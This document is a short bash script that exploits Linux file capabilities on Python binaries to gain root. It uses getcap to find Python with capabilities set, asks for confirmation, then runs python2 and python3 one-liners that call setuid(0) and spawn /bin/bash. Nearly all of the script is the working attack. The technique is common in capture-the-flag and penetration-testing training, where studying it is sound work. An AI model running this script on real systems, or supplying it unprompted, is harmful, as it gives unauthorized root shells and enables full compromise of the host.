#!/bin/bash

echo "Searching for python capabilities..."

if [[ $(getcap -r / 2>/dev/null | grep '/usr/bin/python') ]]; then
  echo "Found something!"
else
  echo "Nothing to see here..."; exit

fi

read -p "Do you want to try and exploit this? (y/n) " -n 1 -r
echo    # (optional) move to a new line
if [[ ! $REPLY =~ ^[Yy]$ ]]
then
    exit 1
fi

echo "Testing for python2"
sleep 3

if [[ $(python -c 'import os; os.setuid(0); os.system("/bin/bash")') ]]; then
  echo "python2 doesn't seem to work"
else
  echo "Testing for python3"
fi
sleep 3

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
